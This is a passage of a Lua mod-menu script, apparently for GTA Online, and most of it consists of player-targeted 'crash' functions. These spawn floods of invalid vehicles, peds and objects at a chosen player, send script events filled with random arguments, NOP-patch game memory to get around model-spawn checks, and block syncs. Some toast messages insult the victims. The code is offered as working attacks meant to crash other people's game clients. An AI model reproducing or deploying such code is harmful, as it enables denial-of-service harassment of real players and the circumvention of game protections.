    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()),0,0,39)
    wait(700)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()),2457,-8457,59)
    wait(700)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()),0,0,39)
    wait(700)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()),2457,-8457,59)
    wait(700)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()),0,0,39)
    wait(700)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED(players.user()),playerx.x,playerx.y,playerx.z)
    end)
function clone(vehicle)
    local vehicleHeading<const> = ENTITY.GET_ENTITY_HEADING(vehicle)
    local vehicleHash<const> = ENTITY.GET_ENTITY_MODEL(vehicle)
    local coords = ENTITY.GET_ENTITY_COORDS(vehicle)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle)
    local rot = v3.toDir(ENTITY.GET_ENTITY_ROTATION(vehicle, 2))
    v3.mul(rot, -getDimensions(vehicle).x - 2)
    v3.add(coords, rot)
    local cloneVehicle<const> = entities.create_vehicle(vehicleHash, coords, vehicleHeading)
    copyVehicleData(vehicle, cloneVehicle)
    return cloneVehicle
end
local minimum<const> = memory.alloc()
local maximum<const> = memory.alloc()
function getDimensions(entity)
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
    local minimum_vec<const> = v3.new(minimum)
    local maximum_vec<const> = v3.new(maximum)
    local dimensions<const> = {
        x = maximum_vec.y - minimum_vec.y,
        y = maximum_vec.x - minimum_vec.x,
        z = maximum_vec.z - minimum_vec.z
    }
    return dimensions
end
local colorR, colorG, colorB = memory.alloc(1), memory.alloc(1), memory.alloc(1)
function copyVehicleData(vehicle, cloneVehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(cloneVehicle, 0)
    for i = 17, 22 do
        VEHICLE.TOGGLE_VEHICLE_MOD(cloneVehicle, i, VEHICLE.IS_TOGGLE_MOD_ON(vehicle, i))
    end
    for i = 0, 49 do
        local modValue<const> = VEHICLE.GET_VEHICLE_MOD(vehicle, i)
        VEHICLE.SET_VEHICLE_MOD(cloneVehicle, i, modValue)
    end
    if VEHICLE.GET_IS_VEHICLE_PRIMARY_COLOUR_CUSTOM(vehicle) then
        VEHICLE.GET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    else
        VEHICLE.GET_VEHICLE_MOD_COLOR_1(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_MOD_COLOR_1(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    end
    if VEHICLE.GET_IS_VEHICLE_SECONDARY_COLOUR_CUSTOM(vehicle) then
        VEHICLE.GET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    else
        VEHICLE.GET_VEHICLE_MOD_COLOR_2(vehicle, colorR, colorG)
        VEHICLE.SET_VEHICLE_MOD_COLOR_2(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
    end
    VEHICLE.GET_VEHICLE_COLOURS(vehicle, colorR, colorG)
    VEHICLE.SET_VEHICLE_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
    VEHICLE.GET_VEHICLE_EXTRA_COLOURS(vehicle, colorR, colorG)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
    VEHICLE.GET_VEHICLE_EXTRA_COLOUR_5(vehicle, colorR) -- interior
    VEHICLE.GET_VEHICLE_EXTRA_COLOUR_6(vehicle, colorG)
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(cloneVehicle, memory.read_ubyte(colorR)) -- dashboard
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(cloneVehicle, memory.read_ubyte(colorG)) -- interior
    VEHICLE.GET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colorR, colorG, colorB)
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    VEHICLE.GET_VEHICLE_NEON_COLOUR(vehicle, colorR, colorG, colorB)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(cloneVehicle, i, VEHICLE.GET_VEHICLE_NEON_ENABLED(vehicle, i))
    end
    local windowTint<const> = VEHICLE.GET_VEHICLE_WINDOW_TINT(vehicle)
    VEHICLE.SET_VEHICLE_WINDOW_TINT(cloneVehicle, windowTint)
    local lightsColor<const> = VEHICLE.GET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle)
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(cloneVehicle, lightsColor)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle))
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT(vehicle))
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(cloneVehicle, VEHICLE.GET_VEHICLE_TYRES_CAN_BURST(vehicle))
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(cloneVehicle, VEHICLE.GET_VEHICLE_DIRT_LEVEL(vehicle))
    for i = 1, 14 do
        VEHICLE.SET_VEHICLE_EXTRA(cloneVehicle, i, not VEHICLE.IS_VEHICLE_EXTRA_TURNED_ON(vehicle, i))
    end
    local roofState<const> = VEHICLE.GET_CONVERTIBLE_ROOF_STATE(vehicle)
    if roofState == 1 or roofState == 2 then
        VEHICLE.LOWER_CONVERTIBLE_ROOF(cloneVehicle, true)
    end
    VEHICLE.SET_VEHICLE_ENGINE_ON(cloneVehicle, VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(vehicle), true, true)
    end
other_crash = GT(PlayerMainMenu, "其他崩溃")
    GTLuaScript.click_slider(other_crash,"导弹车崩溃", {"Chernobog Crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)
        if on_change == 1 then	
            daodanchev1(pid) 
        end
        if on_change == 2 then	
            daodanchev2(pid)
        end
    end)
anim_request = function(hash)
    STREAMING.REQUEST_ANIM_DICT(hash)
    while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
    wait()
    end
end
--
local spec_if_necessary <const> = {}
local cam_if_necessary <const> = {}
function check_player_vehicle_and_spec_if_necessary(pid, callback)
    if ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)).z == -50 then
        util.create_thread(function()
            cam_if_necessary[pid] = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
            CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
            spec_if_necessary[pid] = true
            local time <const> = util.current_time_millis() + 5000
            while time > util.current_time_millis() and spec_if_necessary[pid] do
                CAM.SET_CAM_ROT(cam_if_necessary[pid], -90.0, 0, ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), 2)
                CAM.SET_CAM_COORD(cam_if_necessary[pid], ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)).x,
                ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)).y, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)).z + 5)
                wait()
            end
            CAM.DESTROY_CAM(cam_if_necessary[pid], false)
            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
        end, nil)
        local time <const> = util.current_time_millis() + 5000
        repeat wait() until time < util.current_time_millis() or ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)).z ~= -50
    end
    callback()
    spec_if_necessary[pid] = false
end
updates:action("三千次", {}, "", function()
    m_de_remove_crash = true
    local hash = 0xD6BC7523
    request_model(hash)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pattern = "48 8B C8 FF 52 30 84 C0 74 05 48"
    local base_addr = memory.scan(pattern)
    if base_addr == 0 then
        util.toast("内存扫描失败")
        m_de_remove_crash = false
        return
    end
    local m_model_spawn_bypass_address = base_addr + 0x9090
    for i = 0, 2999 do
        if not ENTITY.DOES_ENTITY_EXIST(playerPed) then
            break
        end
        local pos = ENTITY.GET_ENTITY_COORDS(playerPed, false)
        local heading = ENTITY.GET_ENTITY_HEADING(playerPed)
        memory.write_short(m_model_spawn_bypass_address, 0x9090)
        crash_veh = VEHICLE.CREATE_VEHICLE(hash, pos.x, pos.y, pos.z, heading, true, true, false)
        memory.write_short(m_model_spawn_bypass_address, 0x0574)
        wait()
        entities.delete_by_handle(crash_veh)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    util.toast("OK")
    m_de_remove_crash = false
end)
GTAC(updates, "多重无效标记", {}, "", function()
    local c_table = {}
    local mopos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for i = 1, 10, 1 do
           local mo = entities.create_object(3613262246, mopos)
           c_table[#c_table + 1] = mo
           OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(mo, 1, false)
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(mo)
           ENTITY.SET_ENTITY_COORDS_NO_OFFSET(mo, mopos.x,mopos.y,mopos.z, 
           ENTITY.GET_ENTITY_HEADING(mopos), 10)
           TASK.TASK_VEHICLE_TEMP_ACTION(mopos, mo, 18, 777)
           TASK.TASK_VEHICLE_TEMP_ACTION(mopos, mo, 17, 888)
           TASK.TASK_VEHICLE_TEMP_ACTION(mopos, mo, 16, 999)
        end
    wait(2000)
    for k,v in pairs(c_table) do
       entities.delete_by_handle(v)
    end
end)
GTAC(updates, "THE PROJECT", {}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    pos.z = pos.z + 50
    local allvehs = entities.get_all_vehicles_as_handles()
    local model_array = {184361638, 3186376089, 410882957, 1077420264, 240201337}
    local spawn_veh = {}
    for spawn_, vels in pairs(model_array) do
        for i = 1, 15, 1 do
            spawn_veh[spawn_] = spawn_vehicle(vels, pos, 0)
            ENTITY.FREEZE_ENTITY_POSITION(spawn_veh[spawn_], true)
            wait(0)
        end
    end
    wait(10000)
    for delete, value in pairs(allvehs) do
        entities.delete_by_handle(value)
        wait(0)
    end
end)
GTAC(updates, "子是父的威", {}, "", function()
    crashstand(pid)
end)
local plypos = nil
GTAC(updates, 'ID1', {''}, '完成后将传送回原地', function()
    plypos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local start_coords = players.get_position(players.user_ped())
    for i = 1, 10 do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), players.get_position(pid).x, players.get_position(pid).y,
            players.get_position(pid).z)
        wait(0)
    end
    wait(1000)
    local all_vehicles = entities.get_all_vehicles_as_handles()
    for i = 1, #all_vehicles do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(all_vehicles[i])
        PED.SET_PED_INTO_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), all_vehicles[i], 1)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), all_vehicles[i], 33, 1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(all_vehicles[i], ENTITY.GET_ENTITY_COORDS(pid).x,
            ENTITY.GET_ENTITY_COORDS(pid).y, ENTITY.GET_ENTITY_COORDS(pid).z, ENTITY.GET_ENTITY_HEADING(pid))
        wait(5)
    end
    for i = 1, #all_vehicles do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(all_vehicles[i])
        PED.SET_PED_INTO_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), all_vehicles[i], 1)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), all_vehicles[i], 17, 1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(all_vehicles[i], ENTITY.GET_ENTITY_COORDS(pid).x,
            ENTITY.GET_ENTITY_COORDS(pid).y, ENTITY.GET_ENTITY_COORDS(pid).z + 0.5, ENTITY.GET_ENTITY_HEADING(pid))
        wait(5)
    end
    if plypos ~= nil then
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), plypos.x, plypos.y, plypos.z, false, false, false)
        gtoast("传送回原地")
        plypos = nil
    end
end)
local plypos2 = nil
GTAC(updates, 'ID2', {}, '完成后将传送回原地', function(on)
    plypos2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local start_coords = players.get_position(players.user_ped())
    local pos = players.get_position(pid)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos.x, pos.y, pos.z + 350)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
    local hash = util.joaat("player_zero")
    local attempts = 0
    local maxAttempts = 20
    while not STREAMING.HAS_MODEL_LOADED(hash) and attempts < maxAttempts do
        STREAMING.REQUEST_MODEL(hash)
        util.yield(0)
        attempts = attempts + 1
    end
    local invalidped = entities.create_ped(26, hash, pos, 0)
    ENTITY.FREEZE_ENTITY_POSITION(invalidped, true)
    p = 1
    while p <= 10 do
        for i = 0, 600 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos.x, pos.y, pos.z + 350)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
            pos = players.get_position(pid)
            pos.x = pos.x + math.random(-1, 1)
            pos.y = pos.y + math.random(-1, 1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(invalidped, pos.x, pos.y, pos.z)
            PED.SET_PED_COMPONENT_VARIATION(invalidped, 0, math.random(0, 10), math.random(0, 10), 11)
            util.yield(5)
            p = p + 1
        end
    end
    entities.delete(invalidped)
    if plypos2 ~= nil then
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), plypos2.x, plypos2.y, plypos2.z, false, false, false)
        gtoast("传送回原地")
        plypos2 = nil
    end
end)
GTAC(updates, "ID3", {""}, "", function(selectedOption)
    local models = {-252946718, -599568815, 1349725314}
    loadModels(models)
    local there_coords = players.get_position(pid)
    local start_coords = players.get_position(players.user_ped())
    spawn_vehicles_and_peds(pid, 2, -599568815, -252946718, there_coords)
    spawn_bad_vehicles_and_peds(pid, 2, 1349725314, -252946718, there_coords)
    give_crash_ent_control(pid)
    spawned_crash_vehs = {}
    spawned_crash_peds = {}
end)
t3g = GTAC(updates, "T3G Magic", {"t3g"}, "请不要在双开时使用", function()
    util.create_thread(function()
        local obj = util.joaat("prop_tall_grass_ba")
        request_model(obj)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local cobj = OBJECT.CREATE_OBJECT_NO_OFFSET(obj, pos.x, pos.y, pos.z)
        wait(6000)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(model)
    end)
    util.create_thread(function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local my_pos = ENTITY.GET_ENTITY_COORDS(user)
        local anim_dict = ("anim@mp_player_intupperstinker")
        request_animation(anim_dict)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        util.yield(100)
        TASK.TASK_SWEEP_AIM_POSITION(user, anim_dict, "get", "fucked", "retard", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
        util.yield(750)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    end)
    util.create_thread(function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("powersurge")
        util.request_model(veh_mdl)
        util.request_model(mdl)
        for i = 1, 10 do
            if not players.exists(pid) then
                return
            end
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(veh, false)
            ENTITY.SET_ENTITY_VISIBLE(jesus, false)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(100)
            TASK.TASK_SUBMARINE_GOTO_AND_STOP(1, veh, pos.x, pos.y, pos.z, 1)
            util.yield(1000)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        gtoast("已完成")
    end)
end)
xmi = GTAC(updates, "小米崩溃", {"xmicrash"}, "", function()
    local Pos<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local weapon_ped<const> = Cped(26, util.joaat("A_C_Rat"), Pos, 0)
    WEAPON.GIVE_WEAPON_TO_PED(weapon_ped, util.joaat("WEAPON_GRENADE"), 1, true, true)
    local pos<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    TASK.TASK_THROW_PROJECTILE(weapon_ped, pos.x, pos.y, pos.z, 0, false)
    wait(1000)
    entities.delete_by_handle(weapon_ped)
end)
zmi=GTAC(updates, "中米崩溃", {"zmicrash"}, "", function()
    local pos <const> = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0.0, 3.0, 0.0)
    pos.x = pos.x
    pos.y = pos.y
    pos.z = pos.z + 1
    local ped_crash <const> = Cped(26,util.joaat("S_M_M_Janitor"), pos, 0)
    local obj_crash <const> = entities.create_object(util.joaat("v_ilev_gunhook"), pos,0)
    local veh_crash <const> = spawn_vehicle(util.joaat("fixter"), pos, 0)
    PED.SET_PED_TO_RAGDOLL(ped_crash, 99999, 0, 0, false, false, false)
    wait(500)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_crash, ped_crash, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(veh_crash, obj_crash, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
    wait(1000)
    entities.delete_by_handle(ped_crash)
    entities.delete_by_handle(obj_crash)
    entities.delete_by_handle(veh_crash)
end)
dmi=GTAC(updates, "大米崩溃", {"dmicrash"}, "", function()
    busy(pid)
    check_player_vehicle_and_spec_if_necessary(pid, function()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true) then
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), 15, 1000)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), 16, 1000)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), 17, 1000)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), 18, 1000)
    else
        local PlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        PlayerPos.z = PlayerPos.z-10
        local adder <const> = spawn_vehicle(util.joaat("adder"), PlayerPos , 0)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), adder, 15, 1000)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), adder, 16, 1000)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), adder, 17, 1000)
        TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), adder, 18, 1000)
        wait(1000)
        entities.delete_by_handle(adder)
        end
    end)
end)
klmi=GTAC(updates, "卡拉米崩溃", {"klmi"}, "", function()
    menu.trigger_commands("xmicrash" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("zmicrash" .. PLAYER.GET_PLAYER_NAME(pid)) 
    menu.trigger_commands("dmicrash" .. PLAYER.GET_PLAYER_NAME(pid)) 
end)
GTTG(updates, "Rock崩溃", {"rockcrash"}, "", function(loop)
    huoche = loop
    while huoche do
    wait(100)
    local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)) 
    stupid_pos.y = stupid_pos.y - 2
    local mod_vel = {-692292317,-1323100960,4244420235,444583674,184361638,642617954,586013744,920453016,3186376089,1030400667,240201337,
    1492612435, 3517794615, 3889340782, 3253274834,970385471, 2336777441, 184361638, 1030400667, 920453016, 240201337, 642617954, 
    586013744, 868868440, 1550581940, 3334677549, 3186376089,0xc5dd6967,0x58f77553,0x1446590a}       
    for _spawn, value in pairs(mod_vel) do
    local s = {}
    for i = 1, 10, 1 do  
    s[_spawn] = CreateVehicle(value,stupid_pos,0)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(PLAYER.GET_PLAYER_PED(pid),Entity, true, false)
    wait(0)
    end
    end
    wait(100)
    local ar_vs = entities.get_all_vehicles_as_handles()
    for key, value in pairs(ar_vs) do
    entities.delete_by_handle(value)
    end
    end
end)
--
updates:textslider("船船船", {"extasy"}, "提供三种模式，普通模式，远离模式，翻船模式\n第二种模式需要远离目标", {"普通模式","远离模式","翻船模式",}, function(mode)
    wait(100)
    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)) 
    pos.z = pos.z+1 
    local ship = {-1043459709, -276744698, 1861786828, -2100640717,}
    if mode ==2 then
        util.create_thread(function()
            fanchuan(pid)
        end)
        util.create_thread(function()
            OBJECT.CREATE_OBJECT(0x9CF21E0F, pos.x, pos.y, pos.z, true, true, false)
        end)
    end
    if mode ==3 then
        util.create_thread(function()
            busy(pid)
        end)
        util.create_thread(function()
            fanchuan(pid)
        end)
    end
    for crash, value in pairs (ship) do 
        local c = {} 
        for i = 1, 10, 1 do 
            c[crash] = CreateVehicle(value, pos, 0)
            util.create_thread(function()
                busy(pid)
            end)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(c[crash], true, false) 
            ENTITY.FREEZE_ENTITY_POSITION(c[crash])
            ENTITY.SET_ENTITY_VISIBLE(c[crash],false)
            wait(0)
        end 
    end
    wait(100) 
    local handle = entities.get_all_vehicles_as_handles() 
    for clear, value in pairs(handle) do 
        entities.delete_by_handle(value) 
        wait(6000)
        silentclear()
        util.stop_thread()
    end 
end)
--
GTAC(updates, "玻璃渣子", {}, "", function()
    local obj = util.joaat("prop_tall_grass_ba")
    request_model(obj)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local cobj = OBJECT.CREATE_OBJECT_NO_OFFSET(obj, pos.x, pos.y, pos.z)
    wait(6000)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(model)
end)
--
fireworklove = GTAC(updates, "寂寞烟火", {"coastline"}, coasttext, function()
    menu.trigger_commands("levitate on")
    menu.trigger_commands("tphigh")
    wait(1000)
    fireworkcrash(pid)
    wait(0)
    rocketkoko(pid)
    wait(0)
    menu.trigger_commands("givesh".. PLAYER.GET_PLAYER_NAME(pid))
    wait(0)
    commandsc(pid)
    wait(0)
    weedfire(pid)
    gtoast("请等待10秒...")
    wait(10000)
    gtoast("崩溃已结束,允许再次点击")
    menu.trigger_commands("levitate off")
    menu.trigger_commands("tplsia")
    wait(100)
    menu.trigger_commands("superc")
end)
GTAC(updates,"十二十二", {"12crash"}, "建议长按使用喔~", function()
    menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pid))
    if pid ~= players.user() then
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("taxi")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                wait(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                wait(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end  
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end
end)
-- GT Functions
local OFNKkdmf = 5
GT = {
int = function(global, value)
local radress = memory.script_global(global)
memory.write_int(radress, value)
end,
anim_request = function(hash)
STREAMING.REQUEST_ANIM_DICT(hash)
while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
wait()
end
end,
request_model = function(hash, timeout)
timeout = timeout or 3
STREAMING.REQUEST_MODEL(hash)
local end_time = os.time() + timeout
repeat
wait()
until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
return STREAMING.HAS_MODEL_LOADED(hash)
end,
BlockSyncs = function(player_id, callback)
for _, i in ipairs(players.list(false, true, true)) do
if i ~= player_id then
local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
menu.trigger_command(outSync, "on")
end
end
wait(10)
callback()
for _, i in ipairs(players.list(false, true, true)) do
if i ~= player_id then
local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
menu.trigger_command(outSync, "off")
end
end
end,
power_crash = function(player_id)
for i, v in pairs(ryze.kicks) do
arg1 = math.random(-2147483647, 2147483647)
arg2 = math.random(-1987543, 1987543)
arg3 = math.random(-19, 19)
util.trigger_script_event(1 << player_id, {v, player_id, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
wait()
end
gtoast("崩溃已经发送给这个傻逼 " .. PLAYER.GET_PLAYER_NAME(player_id))
end
}
GT = GTluaScript.list
lovecrash = GT(updates, "恋爱循环", {}, "")
GTLP(lovecrash, "恋爱循环", {"lovecrash"}, "孤独且温柔", function(on_toggle)
    if on_toggle then
        wait(100)
        menu.trigger_commands("loveclick".. PLAYER.GET_PLAYER_NAME(pid))
        wait(100)
        menu.trigger_commands("steamroll".. PLAYER.GET_PLAYER_NAME(pid))
    else
        wait(100)
        menu.trigger_commands("loveclick".. PLAYER.GET_PLAYER_NAME(pid))
        wait(100)
        menu.trigger_commands("steamroll".. PLAYER.GET_PLAYER_NAME(pid))
    end
end)
GTAC(lovecrash, "一见钟情", {'loveclick'}, "一次次的孤独", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local mdl = util.joaat("cs_taostranslator2")
    while not STREAMING.HAS_MODEL_LOADED(mdl) do
        STREAMING.REQUEST_MODEL(mdl)
        wait(5)
    end
    local ped = {}
    for i = 1, 10 do 
        local coord = ENTITY.GET_ENTITY_COORDS(player, true)
        local pedcoord = ENTITY.GET_ENTITY_COORDS(0,ped[i], false)
        ped[i] = entities.create_ped(0, mdl, coord, 0)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
        WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
        ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
        wait(25)
    end
    wait(2500)
    for i = 1, 10 do
        entities.delete_by_handle(ped[i])
        wait(25)
    end
end)
    GTTG(PlayerMainMenu, '怒不可遏5.0', {"unableanger5th"},
    '让您的对手怒不可遏!!!\nGRANDTOURINGVIP经典崩溃', function(on)
        if on then
